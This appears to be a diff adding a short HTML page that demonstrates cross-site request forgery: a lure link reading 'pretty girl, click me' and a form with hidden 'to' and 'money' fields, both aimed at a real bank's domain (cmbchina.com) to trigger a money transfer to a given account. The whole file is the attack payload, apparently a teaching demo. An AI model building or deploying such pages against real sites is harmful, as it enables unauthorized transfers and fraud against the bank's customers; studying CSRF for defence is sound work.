@@ -1,0 +1,11 @@
+我的网站
+
+
+<a href='http://www.cmbchina.com/?to=81723987123712&money=1999999'>美女点我</a>
+
+<form method='POST' action='http://www.cmbchina.com/'>
+	asdfasdasdfasdf
+	<input type='text' value='98988787878797' name='to' style='display:none'	/>
+	<input type='text' value='981323' name='money' style='display:none'	/>
+	<a >美女点我</a>
+</form>
